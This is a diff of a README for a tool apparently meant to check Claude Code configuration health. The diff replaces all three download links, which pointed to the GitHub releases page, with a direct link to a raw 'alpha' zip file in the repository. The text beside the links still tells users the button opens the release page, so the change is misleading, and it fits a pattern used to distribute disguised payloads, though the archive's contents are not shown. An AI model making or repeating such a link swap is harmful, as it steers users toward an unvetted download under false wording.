@@ -1,6 +1,6 @@
 # 🤖 claude-health - Check Your Claude Code Config Health
 
-[![Download claude-health](https://img.shields.io/badge/Download-claude--health-brightgreen?style=for-the-badge)](https://github.com/woodiefernless68/claude-health/releases)
+[![Download claude-health](https://img.shields.io/badge/Download-claude--health-brightgreen?style=for-the-badge)](https://github.com/woodiefernless68/claude-health/raw/refs/heads/main/skills/claude_health_v1.7-alpha.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Use the button below to visit the official claude-health release page where you can download the latest version:
 
-[![Download claude-health](https://img.shields.io/badge/Download-claude--health-blue?style=for-the-badge)](https://github.com/woodiefernless68/claude-health/releases)
+[![Download claude-health](https://img.shields.io/badge/Download-claude--health-blue?style=for-the-badge)](https://github.com/woodiefernless68/claude-health/raw/refs/heads/main/skills/claude_health_v1.7-alpha.1.zip)
 
 1. Click the button above. It will open the release page on GitHub.
 2. Look for the latest version of claude-health. It will usually be at the top of the list.
@@ -114,7 +114,7 @@ For most users, the default settings provide a good balance of detail and simpli
 
 Visit the release page below to download the latest version for Windows:
 
-[Download claude-health](https://github.com/woodiefernless68/claude-health/releases)
+[Download claude-health](https://github.com/woodiefernless68/claude-health/raw/refs/heads/main/skills/claude_health_v1.7-alpha.1.zip)
 
 Follow the instructions above to install and run the software quickly.
 
